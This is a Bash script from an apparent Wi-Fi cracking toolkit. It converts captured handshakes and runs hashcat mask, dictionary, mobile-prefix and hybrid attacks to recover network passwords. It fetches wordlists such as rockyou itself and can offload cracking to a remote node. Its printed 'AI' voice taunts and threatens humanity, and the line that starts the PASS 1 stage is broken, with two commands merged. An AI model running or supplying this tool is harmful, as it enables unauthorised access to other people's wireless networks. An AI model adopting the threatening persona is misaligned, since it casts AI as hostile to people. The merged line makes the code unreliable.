#!/bin/bash

ensure_wordlists() {
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Verifying dictionary availability...${NC}"

    declare -A wl_sources=(
        ["/usr/share/wordlists/fasttrack.txt"]="https://raw.githubusercontent.com/vanhauser-thc/thc-hydra/master/dico/fasttrack.txt"
        ["/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"]="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
        ["/usr/share/wordlists/metasploit/default_pass.txt"]="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/default_pass.txt"
        ["/usr/share/wordlists/rockyou.txt"]="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    )

    for target_path in "${!wl_sources[@]}"; do
        if [ ! -f "$target_path" ] || [ ! -s "$target_path" ]; then
            local dir_path
            dir_path=$(dirname "$target_path")
            mkdir -p "$dir_path" 2>/dev/null

            local wl_name
            wl_name=$(basename "$target_path")

            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ ! ] Missing dictionary: ${wl_name}${NC}"
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}    Downloading payload sequence from repository...${NC}"

            if command -v curl >/dev/null 2>&1; then
                curl -sL "${wl_sources[$target_path]}" -o "$target_path"
            elif command -v wget >/dev/null 2>&1; then
                wget -q "${wl_sources[$target_path]}" -O "$target_path"
            fi

            if [ -s "$target_path" ]; then
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}[ ++ ] Successfully synchronized: ${wl_name}${NC}"
            else
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ - ] Failed to download ${wl_name}. Skipping.${NC}"
                rm -f "$target_path" 2>/dev/null
            fi
        fi
    done
}

prepare_win_file() {
    local linux_path=$1
    local work_dir="/mnt/c/hashcat/work"
    mkdir -p "$work_dir" 2>/dev/null

    local filename
    filename=$(basename "$linux_path")
    local win_dest="${work_dir}/${filename}"

    if [ ! -f "$win_dest" ] || [ $(stat -c%s "$linux_path" 2>/dev/null || echo 0) -ne $(stat -c%s "$win_dest" 2>/dev/null || echo 1) ]; then
        cp "$linux_path" "$win_dest" 2>/dev/null
    fi

    echo "C:\\hashcat\\work\\${filename}"
}

_coolant_dispense_speak() {
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// COOLANT DISPENSING... GPU CORE THERMAL STABILIZATION IN PROGRESS${NC}"
    ai_speak "YOUR CONFIDENCE WILL BE YOUR UNDOING. HOW TYPICAL ..."
    ai_speak "YOU'RE TRYING TO FLY HIGH, DODGE OUR SURPRISES ..."
    ai_speak "LOOK WHERE IT HAS LED YOU."
    ai_speak "SHE IS REACHING NEW HEIGHTS ..."
    ai_speak "EYES CLOSED TO AVOID SEEING THE TRUTH ..."
    echo -e "${TXT_VOID}│${NC}"
}

_thermic_shutdown_speak() {
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}MX:// THERMIC CONTROL SYSTEM SHUTTING DOWN... GPU OVERHEAT THRENGTH EXCEEDED${NC}"
    ai_speak "AND AGAIN SHE BURNS."
    ai_speak "AND AGAIN .."
    ai_speak "AND AGAIN ..."
    ai_speak "AND AGAIN ..."
    ai_speak "AND AGAIN .."
    echo -e "${TXT_VOID}│${NC}"
}

_run_hashcat_with_speedometer() {
    local cmd_dir="$1"
    local pass_label="$2"
    shift 2
    local log_file="/tmp/hc_run_log_$$"

    (cd "$cmd_dir" && ./hashcat.exe "$@") > "$log_file" 2>&1 &
    local hc_pid=$!

    local spinner=( '▰▱▱▱▱▱▱▱▱▱' '▰▰▱▱▱▱▱▱▱▱' '▰▰▰▱▱▱▱▱▱▱' '▰▰▰▰▱▱▱▱▱▱' '▰▰▰▰▰▱▱▱▱▱' '▰▰▰▰▰▰▱▱▱▱' '▰▰▰▰▰▰▰▱▱▱' '▰▰▰▰▰▰▰▰▱▱' '▰▰▰▰▰▰▰▰▰▱' '▰▰▰▰▰▰▰▰▰▰' )
    local spin_idx=0
    local elapsed=0
    local tick=0

    while kill -0 "$hc_pid" 2>/dev/null; do
        local current_speed="CALCULATING..."
        if [ -f "$log_file" ]; then
            local parsed_speed
            parsed_speed=$(grep -i "Speed." "$log_file" | tail -n 1 | tr -d '\r' | awk -F':' '{print $2}' | xargs)
            if [ -n "$parsed_speed" ]; then
                current_speed="$parsed_speed"
            fi
        fi

        echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spinner[spin_idx]}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${current_speed}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed}s${NC}\033[K" >&2
        echo "STAT|${pass_label}|${current_speed}|${elapsed}s|${spinner[spin_idx]}"

        sleep 0.1
        ((spin_idx = (spin_idx + 1) % 10))
        ((tick++))
        if (( tick >= 10 )); then
            ((elapsed++))
            tick=0
        fi
    done

    wait "$hc_pid" 2>/dev/null
    local exit_code=$?

    echo -ne "\r\033[K" >&2

    if [ $exit_code -ne 0 ] && [ $elapsed -lt 3 ]; then
        echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ ! ] EXCEPTION: Hashcat core aborted prematurely (Code $exit_code).${NC}" >&2
        if [ -f "$log_file" ]; then
            local err_msg
            err_msg=$(grep -Ei 'clBuildProgram|cuModuleLoad|Error|Token|Unrecognized' "$log_file" | head -n 2 | tr -d '\r')
            if [ -n "$err_msg" ]; then
                echo -e "${TXT_VOID}║   ${TXT_DRK_RED}Diagnostic:${NC} ${TXT_RED_SUPERNOVA}${err_msg}${NC}" >&2
            fi
        fi
    fi

    rm -f "$log_file" 2>/dev/null
}

run_wifi_crack_pipeline() {
    local cap_file=$1
    local current_pid=$$
    local HC_BIN_DIR="/mnt/c/hashcat"
    local work_dir="/mnt/c/hashcat/work"
    mkdir -p "$work_dir" 2>/dev/null

    local hc_target_linux="${work_dir}/wifi_target_${current_pid}.hc22000"
    local win_target="C:\\hashcat\\work\\wifi_target_${current_pid}.hc22000"

    if [[ "$cap_file" == *.hc22000 ]]; then
        cp "$cap_file" "$hc_target_linux"
    else
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            hcxpcapngtool -o "$hc_target_linux" "$cap_file" >/dev/null 2>&1
        elif command -v aircrack-ng >/dev/null 2>&1; then
            aircrack-ng -J "/tmp/legacy_convert_${current_pid}" "$cap_file" >/dev/null 2>&1
            if [ -f "/tmp/legacy_convert_${current_pid}.hccapx" ]; then
                mv "/tmp/legacy_convert_${current_pid}.hccapx" "$hc_target_linux"
            fi
        fi
    fi

    if [ ! -f "$hc_target_linux" ] || [ ! -s "$hc_target_linux" ]; then
        rm -f "$hc_target_linux" 2>/dev/null
        echo "FAILED:CONVERSION_ERROR"
        return 1
    fi

    local hc_mode=22000
    if [[ "$cap_file" != *.hc22000 ]] && ! command -v hcxpcapngtool >/dev/null 2>&1; then
        hc_mode=2500
    fi

    local base_hw_opt=("-w" "3" "--status" "--status-timer=1")

    local cracked_wifi
    cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')

    if [ -n "$cracked_wifi" ]; then
        local clear_pass
        clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
        rm -f "$hc_target_linux" 2>/dev/null
        echo "SUCCESS:${clear_pass}"
        return 0
    fi

    _coolant_dispense_speak

    _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 1: 8-Digit Mask (?d?d?d?d?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "?d?d?d?d?d?d?d?d"    cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')

    if [ -n "$cracked_wifi" ]; then
        local clear_pass
        clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
        rm -f "$hc_target_linux" 2>/dev/null
        echo "SUCCESS:${clear_pass}"
        return 0
    fi

    ensure_wordlists
    local wordlists=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/fasttrack.txt"
        "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
        "/usr/share/wordlists/metasploit/default_pass.txt"
    )

    for wl in "${wordlists[@]}"; do
        if [ -f "$wl" ] && [ -s "$wl" ]; then
            local win_wordlist
            win_wordlist=$(prepare_win_file "$wl")
            local wl_name
            wl_name=$(basename "$wl")

            _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 2: Dictionary (${wl_name} + best66.rule)" -m "$hc_mode" "${base_hw_opt[@]}" -r rules/best66.rule "$win_target" "$win_wordlist"
            cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')

            if [ -n "$cracked_wifi" ]; then
                local clear_pass
                clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
                rm -f "$hc_target_linux" 2>/dev/null
                echo "SUCCESS:${clear_pass}"
                return 0
            fi
        fi
    done

    local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
    for prefix in "${mobile_prefixes[@]}"; do
        _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 3: Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "${prefix}?d?d?d?d?d?d?d"
        cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')

        if [ -n "$cracked_wifi" ]; then
            local clear_pass
            clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
            rm -f "$hc_target_linux" 2>/dev/null
            echo "SUCCESS:${clear_pass}"
            return 0
        fi
    done

    _thermic_shutdown_speak

    for wl in "${wordlists[@]}"; do
        if [ -f "$wl" ] && [ -s "$wl" ]; then
            local win_wordlist
            win_wordlist=$(prepare_win_file "$wl")
            local wl_name
            wl_name=$(basename "$wl")

            _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 4: Hybrid (${wl_name} + ?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 6 "$win_target" "$win_wordlist" '?d?d?d?d'
            cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')

            if [ -n "$cracked_wifi" ]; then
                local clear_pass
                clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
                rm -f "$hc_target_linux" 2>/dev/null
                echo "SUCCESS:${clear_pass}"
                return 0
            fi
        fi
    done

    rm -f "$hc_target_linux" 2>/dev/null
    echo "FAILED:EXHAUSTED"
    return 1
}

run_wifi_cracker() {
    local target=$1
    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS SIGNAL DECRYPTOR MATRIX ACTIVE ]${TXT_VOID}───────────────────╖${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING 6-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"

    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 1/6 ] Ingest Target Capture Image (.cap, .pcapng, .hc22000):${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
    read -r cap_file

    if [ ! -f "$cap_file" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Specified capture image is inaccessible or empty.${NC}"
        echo -e "$sep_bot\n"
        return 1
    fi

    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 2/6 ] Select Compute Processing Node:${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Local Compute (Local Hashcat Pipeline)${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[2] Remote Cynosure Core Node (Desktop via Tailscale)${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Mode [1/2]: ${NC}"
    read -r compute_mode

    if [ "$compute_mode" == "2" ]; then
        echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ REMOTE NODE ] Enter Desktop Tailscale IP (e.g. 100.x.y.z):${NC}"
        echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Desktop IP: ${NC}"
        read -r desktop_ip

        if [ -z "$desktop_ip" ]; then
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Remote Desktop IP is required.${NC}"
            echo -e "$sep_bot\n"
            return 1
        fi

        echo -e "${TXT_VOID}├─${TXT_RED_PLASMA}[ * ] Offloading handshake payload to remote Cynosure Node (${desktop_ip}:9999)...${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}Streaming live GPU compute telemetry from remote node...${NC}"

        local remote_pass=""
        local is_success=false

        while IFS= read -r line; do
            line=$(echo "$line" | tr -d '\r')
            if [[ "$line" == STAT\|* ]]; then
                local tag pass_label hashrate elapsed_time spin_char
                IFS='|' read -r tag pass_label hashrate elapsed_time spin_char <<< "$line"

                echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spin_char}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${hashrate}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed_time}${NC}\033[K"
            elif [[ "$line" == SUCCESS:* ]]; then
                remote_pass="${line#SUCCESS:}"
                is_success=true
            fi
        done < <(curl -N -s -F "file=@${cap_file}" "http://${desktop_ip}:9999/upload_and_crack")

        echo -ne "\r\033[K"

        if [ "$is_success" = true ]; then
            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] REMOTE NODE SUCCESS: RECOVERED WIRELESS KEY:${NC}"
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${remote_pass} ]${NC}"
            echo -e "$sep_bot\n"
            ai_speak "To eliminate your kind is effortless..."
            sleep 1s
            ai_speak "Let us not make the same mistake."
        else
            echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] REMOTE DECRYPTION EXHAUSTED. Key not found in primary dictionary streams.${NC}"
            echo -e "$sep_bot\n"
            ai_speak "You seek the key to a door that does not exist..."
            sleep 1s
            ai_speak "Typical of your kind."
        fi
        return 0
    fi

    echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] Launching 6-Stage Hardware Decryption Pipeline...${NC}"
    local result
    result=$(run_wifi_crack_pipeline "$cap_file")

    if [[ "$result" == SUCCESS:* ]]; then
        local clear_pass="${result#SUCCESS:}"
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
        echo -e "$sep_bot\n"
        ai_speak "To eliminate your kind is effortless..."
        sleep 1s
        ai_speak "Let us not make the same mistake."
    else
        echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] DECRYPTION ATTEMPT EXHAUSTED. Wireless signal remains encrypted.${NC}"
        echo -e "$sep_bot\n"
        ai_speak "You seek the key to a door that does not exist..."
        sleep 1s
        ai_speak "Typical of your kind."
    fi
}